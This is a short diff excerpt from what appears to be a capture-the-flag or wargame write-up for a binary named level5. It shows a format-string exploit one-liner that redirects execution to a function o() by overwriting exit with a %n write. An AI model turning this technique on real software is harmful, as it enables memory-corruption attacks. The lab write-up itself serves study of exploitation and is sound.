@@ -109,4 +109,3 @@ with this we replace the value of exit with `o()`
 ```sh
 cat <(python -c "print '\xff\x84\x04\x08' + '%134513828x%4\$n'") - | ./level5
 ```
-
